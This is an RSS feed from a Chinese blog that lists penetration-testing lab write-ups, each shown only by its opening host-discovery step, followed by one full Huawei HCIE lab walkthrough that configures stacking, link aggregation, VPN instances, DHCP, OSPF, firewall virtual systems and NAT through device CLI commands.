<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>TriumphK Blog</title><link>https://7r1UMPHK.github.io</link><description>当你的才华不足以满足你的野心时，应该静下心来努力学习。</description><copyright>TriumphK Blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://7r1umphk.github.io/image/20250716100121947.webp</url><title>avatar</title><link>https://7r1UMPHK.github.io</link></image><lastBuildDate>Sat, 23 Aug 2025 04:10:41 +0000</lastBuildDate><managingEditor>TriumphK Blog</managingEditor><ttl>60</ttl><webMaster>TriumphK Blog</webMaster><item><title>内部_novice-admin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</link><description># **一、信息收集**

## **1.1 主机发现**

首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</guid><pubDate>Sat, 23 Aug 2025 04:10:08 +0000</pubDate></item><item><title>内部_Grav</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</link><description># **一、信息收集**

首先，在目标网段内使用`arp-scan`进行主机发现，确定目标主机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Grav.html</guid><pubDate>Thu, 21 Aug 2025 11:09:12 +0000</pubDate></item><item><title>内部_Chat2</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</link><description># **一、信息收集**

首先，在与目标网络相同的网段下，使用 `arp-scan` 工具对C段进行扫描，以发现内网中的存活主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html</guid><pubDate>Thu, 21 Aug 2025 02:27:36 +0000</pubDate></item><item><title>hmv_Lazzycorp</title><link>https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</link><description># **一、信息收集**

## **主机发现**

首先，在当前网段内进行主机发现，以确定目标靶机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Lazzycorp.html</guid><pubDate>Tue, 19 Aug 2025 14:51:41 +0000</pubDate></item><item><title>thl_watchstore</title><link>https://7r1UMPHK.github.io/post/thl_watchstore.html</link><description># **一、信息收集**

## **1.1 主机发现**

首先，在当前网段中使用 `arp-scan` 进行主机发现，确定目标主机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_watchstore.html</guid><pubDate>Mon, 18 Aug 2025 11:49:27 +0000</pubDate></item><item><title>thl_HellRoot</title><link>https://7r1UMPHK.github.io/post/thl_HellRoot.html</link><description># **一、信息收集**

首先，对目标网段进行主机发现。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_HellRoot.html</guid><pubDate>Sun, 17 Aug 2025 14:15:54 +0000</pubDate></item><item><title>内部_bicker</title><link>https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</link><description># **一、信息收集**

## 1. 主机发现

渗透测试的起点是在目标网络中识别存活主机。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</guid><pubDate>Sun, 17 Aug 2025 03:01:08 +0000</pubDate></item><item><title>thl_ElCandidato</title><link>https://7r1UMPHK.github.io/post/thl_ElCandidato.html</link><description># 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标靶机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ElCandidato.html</guid><pubDate>Sun, 17 Aug 2025 03:00:01 +0000</pubDate></item><item><title>thl_BackToTheFutureI</title><link>https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</link><description># 一、信息收集

## 1.1 主机发现

首先，使用`arp-scan`工具扫描本地网络，寻找目标靶机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</guid><pubDate>Sat, 16 Aug 2025 05:11:22 +0000</pubDate></item><item><title>内部_Sysadmin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先，在本地网络中利用 `arp-scan` 扫描存活主机，定位目标IP。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</guid><pubDate>Sat, 16 Aug 2025 01:25:57 +0000</pubDate></item><item><title>内部_tpN</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</link><description># 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tpN.html</guid><pubDate>Sat, 16 Aug 2025 01:25:13 +0000</pubDate></item><item><title>内部_Temp</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</link><description># **一、信息收集**

首先，在目标网段内使用`arp-scan`进行主机发现，以确定目标的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Temp.html</guid><pubDate>Fri, 15 Aug 2025 14:48:12 +0000</pubDate></item><item><title>内部_TCPRaiders</title><link>https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</link><description># **一、信息收集**

## **1. 主机发现**

首先在本地网络中使用 `arp-scan` 扫描本地网络，以确定目标主机的IP地址。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_TCPRaiders.html</guid><pubDate>Fri, 15 Aug 2025 13:34:38 +0000</pubDate></item><item><title>内部_Book</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Book.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先在本地网络中使用 `arp-scan` 确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Book.html</guid><pubDate>Thu, 14 Aug 2025 23:48:15 +0000</pubDate></item><item><title>hmv_Takedown</title><link>https://7r1UMPHK.github.io/post/hmv_Takedown.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先使用 `arp-scan` 在本地网络中确定目标主机的IP地址，随后利用 `nmap` 对其进行全端口扫描，以识别开放的服务。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Takedown.html</guid><pubDate>Thu, 14 Aug 2025 01:42:42 +0000</pubDate></item><item><title>HCIE-Q1</title><link>https://7r1UMPHK.github.io/post/HCIE-Q1.html</link><description>![image-20250811083621208](http://7r1UMPHK.github.io/image/20250813214159666.webp)

# 1 部署网络可靠性

## 1.1 配置交换机堆叠

*ps:堆叠ensp做不了，暂时不管*

### X_T2_AGG1-2

重启1-2，保证1为主

```
reboot fast
```

### X_T2_AGG1-1

```
stack slot 0 priority 200
int stack-port 0/1
port int X0/0/1 en
shut int X0/0/1
q
int stack-port 0/2
port int X0/0/2 en
shut int X0/0/2
q
```

### X_T2_AGG1-2

```
int stack-port 0/1
port int X0/0/2 en
q
int stack-port 0/2
port int X0/0/1 en
q
q
```

### X_T2_AGG1-1

```
--打开X_T2_AGG1-1堆叠互联接口(建议直接复制)--
int stack-port 0/1
undo shut int X0/0/1
q
int stack-port 0/2
undo shut int X0/0/2
q
----------------------------
sys X_T2_AGG1
dis stack
```

![image-20250811083042852](http://7r1UMPHK.github.io/image/20250813214156783.webp)

&gt; [!TIP]
&gt; 主备倒换:
&gt;
&gt; slave switchover enable
&gt;
&gt; slave switchover
&gt;
&gt; 重置堆叠:
&gt;
&gt; reset stack configuration

*ps:当配置堆叠有误，建议直接重置堆叠*

## 1.2 配置链路聚合

![image-20250811083741031](http://7r1UMPHK.github.io/image/20250813214149499.webp)

*ps:配置链路聚合时注意使用dis ll n b查看互联接口，根据实际情况而定，切勿死记接口编号*

先将相关设备改名，开启lldp

### 批量

```
sys
sys *
ll en
```

### Core

```
[X_T1_Core1]dis lldp neighbor  brief 
Local Intf   Neighbor Dev             Neighbor Intf             Exptime
GE0/0/11     X_T2_AGG1                GE0/0/13                  93     
GE0/0/12     X_T2_AGG1                GE0/0/14                  93     
GE0/0/13     X_T1_AGG1                GE0/0/13                  95     
GE0/0/14     X_T1_AGG1                GE0/0/14                  95     
GE0/0/21     X_T2_AGG1                GE0/0/23                  93     
GE0/0/22     X_T2_AGG1                GE0/0/24                  93     
GE0/0/23     X_T1_AGG1                GE0/0/23                  95     
GE0/0/24     X_T1_AGG1                GE0/0/24                  92    
```

13，14，23，24是eth1的，通常来说是预配的，检查

```
[X_T1_Core1]dis eth
Local:
LAG ID: 1                   WorkingMode: STATIC                               
Preempt Delay: Disabled     Hash arithmetic: According to SIP-XOR-DIP         
System Priority: 32768      System ID: 4c1f-cc7a-6702                         
Least Active-linknumber: 1  Max Active-linknumber: 8                          
Operate status: up          Number Of Up Port In Trunk: 4                     
--------------------------------------------------------------------------------
ActorPortName          Status   PortType PortPri PortNo PortKey PortState Weight
GigabitEthernet0/0/13  Selected 1GE      32768   14     305     10111100  1     
GigabitEthernet0/0/14  Selected 1GE      32768   15     305     10111100  1     
GigabitEthernet0/0/23  Selected 1GE      32768   24     305     10111100  1     
GigabitEthernet0/0/24  Selected 1GE      32768   25     305     10111100  1   
```

那直接配置eth2

```
int eth 2
mode lacp
tr g 0/0/11 0/0/12 0/0/21 0/0/22
q
```

### T2

也是批量打开X_T2_AGG1、X_T2_ACC1、X_T2_ACC2的lldp协议

```
sys
sys *
ll en
```

然后依旧是使用lldp显示出了连接信息配置链路聚合

#### X_T2_AGG1

```
int eth 1
mode lacp
tr g 0/0/13 0/0/14 0/0/23 0/0/24
q
int eth 2
mode lacp
tr g 0/0/11 0/0/21
int eth 3
mode lacp
tr g 0/0/12 0/0/22
q
```

#### X_T2_ACC1

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

#### X_T2_ACC2

```
int eth 1
mode lacp
tr g 0/0/23 0/0/24
q
```

![image-20250811085948464](http://7r1UMPHK.github.io/image/20250813214145946.webp)

# 2-3 基本业务需求与VPN实例配置

![image-20250811090108661](http://7r1UMPHK.github.io/image/20250813214144023.webp)

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## 创建VPN实例

### Core

```
ip v Employee
rou 65001:1
q
q
ip v Guest
rou 65001:2
q
q
```

## 配置VPN与IP

### X_T1_Export2

```
vlan 202
int g6/0/1
p l a
p d v 202
int vlan202
ip add 10.1.200.5 30
int g0/0/0
ip add 10.255.3.1 24
int g0/0/1
ip add 10.255.4.1 24
int l0
ip add 10.1.0.2 32
q
```

### X_T1_Core1

*ps:配置vlan的那里，建议直接开个txt文本修改，那样快一点*

```
v b 60 201 to 209 51 to 55 100 to 105
# 我预配有问题，他X_T1_Core1是a口，X_T1_Export1是t口，我统一一下，不然等会OSPF邻居会卡Init
int g0/0/1
undo port default vlan
undo port link-type
p l t
p t a v 201
int g0/0/2
p l a
p d v 202
int g0/0/3
p t a v 51 to 55 100 to 105 203
int g0/0/4
p l t 
p t a v 204 205
un p t a v 1
int g0/0/5
p l t
p t a v 206 207
un p t a v 1
int g0/0/6
p l a
p d v 60
int vlan60
ip bin vpn-ins Employee
ip add 10.1.60.254 24
int eth2
p l t
p t a v 100 209
q
dhcp en

int vlan202
ip add 10.1.200.6 30
int vlan204
ip add 10.1.200.13 30
int vlan205
ip add 10.1.200.17 30
int vlan206
ip bin vpn-ins Employee
ip add 10.1.200.21 30
int vlan207
ip bin vpn-ins Guest
ip add 10.1.200.25 30
int vlan208
ip bin vpn-ins Employee
ip add 10.1.200.29 30
dhcp select global
int vlan209
ip bin vpn-ins Employee
ip add 10.1.200.33 30
dhcp select global

int l1
ip bin vpn-ins Employee
ip add 10.1.0.4 32
int l2
ip bin vpn-ins Guest
ip add 10.1.0.5 32

int vlan51
ip bin vpn-ins Employee
ip add 10.1.51.254 24
dhcp select global
int vlan 52
ip bin vpn-ins Employee
ip add 10.1.52.254 24
dhcp select global
int vlan53
ip bin vpn-ins Employee
ip add 10.1.53.254 24
dhcp select global
int vlan 54
ip bin vpn-ins Employee
ip add 10.1.54.254 24
dhcp select global
int vlan 55
ip bin vpn-ins Employee
ip add 10.1.55.254 24
dhcp select global

int vlan 101
ip bin vpn-ins Guest
ip add 10.1.101.254 24
dhcp select global
int vlan 102
ip bin vpn-ins Guest
ip add 10.1.102.254 24
dhcp select global
int vlan 103
ip bin vpn-ins Guest
ip add 10.1.103.254 24
dhcp select global
int vlan 104
ip bin vpn-ins Guest
ip add 10.1.104.254 24
dhcp select global
int vlan 105
ip bin vpn-ins Guest
ip add 10.1.105.254 24
dhcp select global
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令：
&gt;
&gt; dis ip vpn-in ver 查看VPN实例绑定的接口

### X_T1_AGG1

```
v b 11 to 15 21 to 25 100 208
int eth2
p h t v 11 to 15 21 to 25 100
int eth3
p h t v 11 to 15 21 to 25
q
```

### X_T2_AGG1

```
v b 100 209 31 to 35 41 to 45
int eth 1
p l t
p t a v 100 209
int eth 2
p h t v 31 to 35 41 to 45
int eth 3
p h t v 100 31 to 35 41 to 45
int vlan 209
ip add 10.1.200.34 30
int l0
ip add 10.1.0.7 32
q
```

### X_T1_ACC1

```
vlan 100
q
int g0/0/22
p l a
p d v 100
int eth 1
p l t
p t a v 100
q
```

### X_T2_ACC2

```
vlan 100
int eth 1
p l t
p t a v 100
int g0/0/22
p l a
p d v 100
q
```

*ps:如果g1-20空非hybrid，则需要改回hybrid*

### X_T1_AC1

```
v b 51 to 55 100 to 105
dhcp en
int vlan 100
ip add 10.1.100.254 255.255.255.0
dhcp select inter
int g0/0/1
p t a v 51 to 55 101 to 105 100 203
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令：
&gt;
&gt; dis vlan sum 检查vlan
&gt;
&gt; dis port vlan 检查vlan划分
&gt;
&gt; dis ip in b      检查ip

# 4 核心交换机DHCP地址池配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

## Core

```
ip pool market11
vpn-in Employee
gate 10.1.11.254
net 10.1.11.0 mask 255.255.255.0
ip pool market12
vpn-in Employee
gate 10.1.12.254
net 10.1.12.0 mask 255.255.255.0
ip pool market13
vpn-in Employee
gate 10.1.13.254
net 10.1.13.0 mask 255.255.255.0
ip pool market14
vpn-in Employee
gate 10.1.14.254
net 10.1.14.0 mask 255.255.255.0
ip pool market15
vpn-in Employee
gate 10.1.15.254
net 10.1.15.0 mask 255.255.255.0

ip pool procure21
vpn-in Employee
gate 10.1.21.254
net 10.1.21.0 mask 255.255.255.0
ip pool procure22
vpn-in Employee
gate 10.1.22.254
net 10.1.22.0 mask 255.255.255.0
ip pool procure23
vpn-in Employee
gate 10.1.23.254
net 10.1.23.0 mask 255.255.255.0
ip pool procure24
vpn-in Employee
gate 10.1.24.254
net 10.1.24.0 mask 255.255.255.0
ip pool procure25
vpn-in Employee
gate 10.1.25.254
net 10.1.25.0 mask 255.255.255.0

ip pool finance31
vpn-in Employee
gate 10.1.31.254
net 10.1.31.0 mask 255.255.255.0
ip pool finance32
vpn-in Employee
gate 10.1.32.254
net 10.1.32.0 mask 255.255.255.0
ip pool finance33
vpn-in Employee
gate 10.1.33.254
net 10.1.33.0 mask 255.255.255.0
ip pool finance34
vpn-in Employee
gate 10.1.34.254
net 10.1.34.0 mask 255.255.255.0
ip pool finance35
vpn-in Employee
gate 10.1.35.254
net 10.1.35.0 mask 255.255.255.0

ip pool hr41
vpn-in Employee
gate 10.1.41.254
net 10.1.41.0 mask 255.255.255.0
ip pool hr42
vpn-in Employee
gate 10.1.42.254
net 10.1.42.0 mask 255.255.255.0
ip pool hr43
vpn-in Employee
gate 10.1.43.254
net 10.1.43.0 mask 255.255.255.0
ip pool hr44
vpn-in Employee
gate 10.1.44.254
net 10.1.44.0 mask 255.255.255.0
ip pool hr45
vpn-in Employee
gate 10.1.45.254
net 10.1.45.0 mask 255.255.255.0

ip pool employee51
vpn-in Employee
gate 10.1.51.254
net 10.1.51.0 mask 255.255.255.0
ip pool employee52
vpn-in Employee
gate 10.1.52.254
net 10.1.52.0 mask 255.255.255.0
ip pool employee53
vpn-in Employee
gate 10.1.53.254
net 10.1.53.0 mask 255.255.255.0
ip pool employee54
vpn-in Employee
gate 10.1.54.254
net 10.1.54.0 mask 255.255.255.0
ip pool employee55
vpn-in Employee
gate 10.1.55.254
net 10.1.55.0 mask 255.255.255.0

ip pool Guest101
vpn-in Guest
gate 10.1.101.254
net 10.1.101.0 mask 255.255.255.0
ip pool Guest102
vpn-in Guest
gate 10.1.102.254
net 10.1.102.0 mask 255.255.255.0
ip pool Guest103
vpn-in Guest
gate 10.1.103.254
net 10.1.103.0 mask 255.255.255.0
ip pool Guest104
vpn-in Guest
gate 10.1.104.254
net 10.1.104.0 mask 255.255.255.0
ip pool Guest105
vpn-in Guest
gate 10.1.105.254
net 10.1.105.0 mask 255.255.255.0
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令:
&gt;
&gt; dis ip pool vpn-ins Employee
&gt;
&gt; dis ip pool vpn-ins Guest

# 5 核心交换机VLAN地址池配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

*ps:这和堆叠ensp都做不了，暂时不管，或者你去AC做测试，那个可以*

## X_T1_AGG1

```
vlan pool market
vlan 11 to 15
vlan pool procure
vlan 21 to 25
q
```

## X_T2_AGG1

```
vlan pool finance
vlan 31 to 35
vlan pool hr
vlan 41 to 45
q
```

## X_T1_AC1

```
vlan pool employee
vlan 51 to 55
vlan pool Guest
vlan 101 to 105
q
```

&gt; [!TIP]
&gt;
&gt; 检查命令:
&gt;
&gt; dis vlan pool all

# 6 三层设备OSPF配置

## 6.1 核心与出口路由器的OSPF配置

### X_T1_Export1

```
ospf 1 rou 10.1.0.1
default-route-advertise always
a 0
net 10.1.0.1 0.0.0.0
net 10.1.200.1 0.0.0.0
q
q
```

### X_T1_Export2

```
ospf 1 rou 10.1.0.2
default-
a 0
net 10.1.0.2 0.0.0.0
net 10.1.200.5 0.0.0.0
q
q
```

### X_T1_Core1

```
ospf 1 rou 10.1.0.3
a 0
net 10.1.0.3 0.0.0.0
net 10.1.200.2 0.0.0.0
net 10.1.200.6 0.0.0.0
net 10.1.200.9 0.0.0.0
q
a 1
net 10.1.200.13 0.0.0.0
q
a 2
net 10.1.200.17 0.0.0.0
q
q
ospf 2 rou 10.1.0.4 vpn-ins Employee
vpn-inst simple
silent-int vlan51
silent-int vlan52
silent-int vlan53
silent-int vlan54
silent-int vlan55
silent-int vlan60
a 1
net 10.1.0.0 0.0.255.255
q
q
ospf 3 rou 10.1.0.5 vpn-ins Guest
vpn-inst simple
silent-int vlan101
silent-int vlan102
silent-int vlan103
silent-int vlan104
silent-int vlan105
a 2
net 10.1.0.0 0.0.255.255
q
q
```

## 6.2 T1汇聚的OSPF配置

### 6.2.1 DHCP配置

![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)

#### X_T1_AGG1

基础配置前面**2 基础业务需求**已经配置过了

*ps:打开你的记事本，ctrl+c，ctrl+v，哈哈哈*

```
dhcp en
int vlan 11
ip add 10.1.11.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 12
ip add 10.1.12.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 13
ip add 10.1.13.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 14
ip add 10.1.14.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 15
ip add 10.1.15.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29

int vlan 21
ip add 10.1.21.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 22
ip add 10.1.22.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 23
ip add 10.1.23.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 24
ip add 10.1.24.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
int vlan 25
ip add 10.1.25.254 255.255.255.0
dhcp select relay
dhcp relay server-ip 10.1.200.29
q
```

##### 检查

![image-20250811170247422](http://7r1UMPHK.github.io/image/20250813214119189.webp)

![image-20250811170400091](http://7r1UMPHK.github.io/image/20250813214117533.webp)

### 6.2.2 OSPF 配置

#### X_T1_AGG1

```
ospf 1 rou 10.1.0.6
silent-int vlan 11
silent-int vlan 12
silent-int vlan 13
silent-int vlan 14
silent-int vlan 15
silent-int vlan 21
silent-int vlan 22
silent-int vlan 23
silent-int vlan 24
silent-int vlan 25
a 1
net 10.1.0.0 0.0.255.255
q
q
```

## 6.3 汇聚的OSPF 配置

### 6.3.1 DHCP配置

#### X_T2_AGG1

基础配置前面**2 基础业务需求**已经配置过了

```
dhcp en
int vlan 31
ip add 10.1.31.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 32
ip add 10.1.32.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 33
ip add 10.1.33.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 34
ip add 10.1.34.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 35
ip add 10.1.35.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33

int vlan 41
ip add 10.1.41.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 42
ip add 10.1.42.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 43
ip add 10.1.43.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 44
ip add 10.1.44.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
int vlan 45
ip add 10.1.45.254 255.255.255.0
dhcp sel rel
dhcp rel server-ip 10.1.200.33
q
```

##### 检查

![image-20250812104327092](http://7r1UMPHK.github.io/image/20250813214115137.webp)

![image-20250812104359037](http://7r1UMPHK.github.io/image/20250813214113229.webp)

### 6.3.2 OSPF 配置

#### X_T2_AGG1

```
ospf 1 rou 10.1.0.7
silent-int vlan 31
silent-int vlan 32
silent-int vlan 33
silent-int vlan 34
silent-int vlan 35
silent-int vlan 41
silent-int vlan 42
silent-int vlan 43
silent-int vlan 44
silent-int vlan 45
a 1
net 10.1.0.0 0.0.255.255
q
q
```

#### X_T1_AC1

*ps:可能会有人问，为什么我都没有配置ip就直接配ospf，是因为他是预配的，你可以看看AC1的ip表*

```
ospf 1 rou 10.1.0.11
a 0
net 10.1.0.11 0.0.0.0
net 10.1.200.10 0.0.0.0
q
q
```

# 7 防火墙配置

## 7.1虚拟系统配置

### X_T1_FW1

&gt; [!TIP]
&gt;
&gt; 默认密码：
&gt;
&gt; admin:Admin@123

```
v b 204 to 207
int g1/0/1
Portsw
p l t
p t a v 204 to 205
un p t a v 1
int g1/0/2
Portsw
p l t
p t a v 206 to 207
un p t a v 1
q
```

### 检查

![image-20250812111534076](http://7r1UMPHK.github.io/image/20250813214111296.webp)

```
int l1
int l2
q
vsys en
vsys name Employee
assign int l1
assign vlan 204
assign vlan 206
int vlan 204
ip add 10.1.200.14 255.255.255.252
int vlan 206
ip add 10.1.200.22 255.255.255.252
int l1
ip add 10.1.0.8 255.255.255.255
q
```

### 检查

![image-20250812154330726](http://7r1UMPHK.github.io/image/20250813214109918.webp)

```
switch vsys Employee
sy
firewall zone trust
add int vlan 206
firewall zone untrust
add int vlan 204
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
vsys en
vsys na Guest
assign int l2
assign vlan 205
assign vlan 207
int vlan 205
ip add 10.1.200.18 255.255.255.252
int vlan 207
ip add 10.1.200.26 255.255.255.252
int l2
ip add 10.1.0.9 255.255.255.255
q

switch vsys Guest
sy
firewall zone trust
add int vlan 207
firewall zone untrust
add int vlan 205
security-po
rule name ospf
source-z trust untrust local
destination-zone trust untrust local
service ospf
action permit
q
q
quit
quit
```

## 7.2 OSPF 的配置

### X_T1_FW1

```
ospf 1 rou 10.1.0.8 vpn-ins Employee
vpn-instance-cap simple
a 1
net 10.1.0.8 0.0.0.0
net 10.1.200.14 0.0.0.0
net 10.1.200.22 0.0.0.0
q
q

ospf 2 rou 10.1.0.9 vpn-ins Guest
vpn-instance-cap simple
a 2
net 10.1.0.9 0.0.0.0
net 10.1.200.18 0.0.0.0
net 10.1.200.26 0.0.0.0
q
q
```

### 验证

去core查看ospf peer

![image-20250812165616221](http://7r1UMPHK.github.io/image/20250813214106871.webp)

一共9个，全部full

# 8 核心交换机过滤指定3类LSA AND 配置 NSSA 区域

*ps:还是建议记事本复制大法*

## X_T1_Core1

```
ip ip-prefix Employee deny 10.1.11.0 24
ip ip-prefix Employee deny 10.1.12.0 24
ip ip-prefix Employee deny 10.1.13.0 24
ip ip-prefix Employee deny 10.1.14.0 24
ip ip-prefix Employee deny 10.1.15.0 24

ip ip-prefix Employee deny 10.1.21.0 24
ip ip-prefix Employee deny 10.1.22.0 24
ip ip-prefix Employee deny 10.1.23.0 24
ip ip-prefix Employee deny 10.1.24.0 24
ip ip-prefix Employee deny 10.1.25.0 24

ip ip-prefix Employee deny 10.1.31.0 24
ip ip-prefix Employee deny 10.1.32.0 24
ip ip-prefix Employee deny 10.1.33.0 24
ip ip-prefix Employee deny 10.1.34.0 24
ip ip-prefix Employee deny 10.1.35.0 24

ip ip-prefix Employee deny 10.1.41.0 24
ip ip-prefix Employee deny 10.1.42.0 24
ip ip-prefix Employee deny 10.1.43.0 24
ip ip-prefix Employee deny 10.1.44.0 24
ip ip-prefix Employee deny 10.1.45.0 24

ip ip-prefix Employee deny 10.1.51.0 24
ip ip-prefix Employee deny 10.1.52.0 24
ip ip-prefix Employee deny 10.1.53.0 24
ip ip-prefix Employee deny 10.1.54.0 24
ip ip-prefix Employee deny 10.1.55.0 24

ip ip-prefix Employee permit 0.0.0.0 0 less-equal 32

ip ip-prefix Guest deny 10.1.101.0 24
ip ip-prefix Guest deny 10.1.102.0 24
ip ip-prefix Guest deny 10.1.103.0 24
ip ip-prefix Guest deny 10.1.104.0 24
ip ip-prefix Guest deny 10.1.105.0 24

ip ip-prefix Guest permit 0.0.0.0 0 less-equal 32

ospf 1
a 1
filter ip-prefix Guest imp
q
a 2
filter ip-prefix Employee imp
nssa
q
q
ospf 3
a 2
nssa
q
q
```

## X_T1_FW1

```
ospf 2
a 2
nssa
q
q
```

## 检查

![image-20250812161934561](http://7r1UMPHK.github.io/image/20250813214104057.webp)

![image-20250812170719317](http://7r1UMPHK.github.io/image/20250813214102133.webp)

# 9 出口网络配置

## X_T1_Export1

```
----这里的是预配的，只是我这拓扑没有----
ip rou 0.0.0.0 0.0.0.0 10.255.1.254
ip rou 0.0.0.0 0.0.0.0 10.255.2.254
acl 2000
rule 5 permit
quit
int g0/0/0
nat out 2000
int g0/0/1
nat out 2000
q
-----------------------------------
acl 2000
undo rule 5
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q
```

## 检查

![image-20250813093949534](http://7r1UMPHK.github.io/image/20250813214100032.webp)

## X_T1_Export2

```
ip rou 0.0.0.0 0.0.0.0 10.255.3.254
ip rou 0.0.0.0 0.0.0.0 10.255.4.254
nat address-group 1 10.255.4.2 10.255.4.100
acl 2000
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q

int g0/0/0
nat out 2000
int g0/0/1
nat server protocol tcp global current-int 8081 ins 10.1.60.101 80
nat out 2000 address-group 1
q
```

## 实现回程流量转发

### Core

```
acl 3001
rule permit ip sou 10.1.60.101 0
int vlan 204
----------这条模拟器做不了，你可以写个描述记忆一下----------
traffic-rediect inbound acl 3001 ip-nexthop 10.1.200.5
-----------------------------------------------------
q
```

### X_T1_Export2

```
acl 3001
rule permit ip sou 10.1.60.101 0
traffic classifier web
if-match acl 3001
traffic behavior web
redirect ip-nexthop 10.255.4.254
traffic policy web
classifier web behavior web
int vlan 202
traffic-policy web inbound
q
```

# 10 WLAN扩展需求

